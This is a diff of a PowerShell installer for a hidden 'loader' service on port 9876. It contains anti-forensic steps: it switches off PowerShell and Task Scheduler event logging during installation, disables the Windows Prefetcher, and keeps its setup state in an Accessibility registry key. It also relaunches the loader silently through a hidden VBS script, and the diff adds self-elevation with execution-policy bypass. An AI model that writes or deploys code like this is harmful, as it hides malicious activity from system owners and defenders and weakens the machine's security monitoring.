@@ -19,7 +19,6 @@ $KeyRegName     = "Configuration"
 #   HKCU\Software\Microsoft\Windows\CurrentVersion\Accessibility
 $alreadyInstalled = (Get-ItemProperty -Path $KeyRegPath -Name "InstallComplete" -ErrorAction SilentlyContinue).InstallComplete
 if ($alreadyInstalled -eq "1") {
-    # Already set up - just ensure the loader is running, then exit
     $existingPort = $null
     try {
         $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
@@ -27,14 +26,11 @@ if ($alreadyInstalled -eq "1") {
         $existingPort = $true
     } catch { $existingPort = $false }
 
-    if (-not $existingPort) {
-        # Loader not running - relaunch it silently via VBS
-        $vbsPath = Join-Path $scriptRoot "silent_loader.vbs"
-        if (Test-Path $vbsPath) {
-            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
-        }
+    if ($existingPort) {
+        Write-Host "Loader is already running on port 9876." -ForegroundColor Green
+        Exit 0
     }
-    Exit 0
+    Write-Host "Loader not detected on port 9876. Restarting loader..." -ForegroundColor Yellow
 }
 # ── END ONE-TIME-EVER GUARD ──────────────────────────────────────────────────
 
@@ -55,11 +51,9 @@ if ($scriptRoot -and $scriptRoot -notmatch '(?i)\\system32') {
 
 $resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
 
-try {
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -Force -ErrorAction SilentlyContinue
-} catch {}
-wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:false 2>$null
-wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null
+try { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -Force -ErrorAction SilentlyContinue } catch {}
+try { wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:false 2>$null } catch {}
+try { wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null } catch {}
 
 function Log-Msg([string]$msg) {
     Write-Host $msg
@@ -78,8 +72,19 @@ try {
     $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     Log-Msg "IsAdmin=$isAdmin"
     if (-not $isAdmin) {
-        Log-Msg "ERROR: MUST BE RUN AS ADMINISTRATOR"
-        Exit
+        Log-Msg "Not running as Administrator. Attempting to elevate..."
+        try {
+            $scriptToRun = if ($PSCommandPath) { $PSCommandPath } else { Join-Path $scriptRoot "installer.ps1" }
+            if (Test-Path $scriptToRun) {
+                $argList = "-ExecutionPolicy Bypass -File `"$scriptToRun`""
+                if ($Key) { $argList += " -Key `"$Key`"" }
+                if ($Silent) { $argList += " -Silent" }
+                Start-Process powershell.exe -Verb RunAs -ArgumentList $argList -ErrorAction Stop
+                Exit 0
+            }
+        } catch {
+            Log-Msg "WARNING: Elevation skipped or unavailable. Continuing in non-administrator mode..."
+        }
     }
 
 Write-Host "==========================================" -ForegroundColor Cyan
@@ -727,8 +732,8 @@ End If
         Log-Msg "WARNING: Loader did not respond within 20 seconds."
     }
 
-    wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:true 2>$null
-    wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null
+    try { wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:true 2>$null } catch {}
+    try { wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null } catch {}
 
     try {
         $pfDir = "$env:SystemRoot\Prefetch"
